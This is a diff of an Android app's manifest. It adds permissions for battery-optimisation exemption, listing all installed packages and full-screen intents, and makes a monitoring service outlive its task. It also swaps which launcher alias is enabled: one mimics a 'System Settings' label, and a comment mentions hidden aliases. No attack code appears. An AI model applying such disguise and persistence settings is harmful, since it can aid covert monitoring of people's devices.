@@ -24,6 +24,9 @@
         android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
 
     <permission
         android:name="com.mmids.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
@@ -150,13 +153,27 @@
 
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity-alias> <!-- Hidden launcher aliases — only one enabled at a time -->
+        </activity-alias>
         <activity-alias
             android:name="com.mmids.AliasSettings"
-            android:enabled="true"
+            android:enabled="false"
             android:exported="true"
             android:icon="@mipmap/ic_launcher"
             android:label="System Settings"
+            android:roundIcon="@mipmap/ic_launcher_round"
+            android:targetActivity="com.mmids.MainActivity" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias> <!-- Hidden launcher aliases — only one enabled at a time -->
+        <activity-alias
+            android:name="com.mmids.AliasMMID"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher"
+            android:label="MMID"
             android:roundIcon="@mipmap/ic_launcher_round"
             android:targetActivity="com.mmids.MainActivity" >
             <intent-filter>
@@ -172,6 +189,7 @@
             android:excludeFromRecents="true"
             android:exported="false"
             android:launchMode="singleInstance"
+            android:screenOrientation="portrait"
             android:showWhenLocked="true"
             android:theme="@style/Theme.MMIDS"
             android:turnScreenOn="true" />
@@ -249,7 +267,8 @@
         <service
             android:name="com.mmids.services.MonitoringService"
             android:exported="false"
-            android:foregroundServiceType="dataSync" />
+            android:foregroundServiceType="dataSync"
+            android:stopWithTask="false" />
 
         <provider
             android:name="androidx.startup.InitializationProvider"
